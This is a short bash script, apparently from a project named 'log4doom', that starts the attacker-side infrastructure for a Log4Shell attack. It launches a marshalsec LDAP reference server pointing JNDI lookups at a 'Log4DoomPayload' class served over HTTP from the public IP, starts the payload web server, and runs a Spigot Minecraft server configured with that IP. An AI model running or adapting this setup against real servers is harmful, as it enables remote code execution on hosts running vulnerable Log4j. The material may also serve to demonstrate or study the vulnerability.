#!/bin/bash

echo "Public ip set to ${PUBLIC_IP}"

# Start LDAP reference server
cd /log4doom
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://${PUBLIC_IP}:3000/#Log4DoomPayload" &

# Start web server
cd /log4doom/PayloadServer
npm start &

# Start minecraft server
cd /log4doom/MinecraftServer
java -Dlog4doomIp=${PUBLIC_IP} -Xmx1G -jar spigot.jar &

# Wait for any to exit
wait -n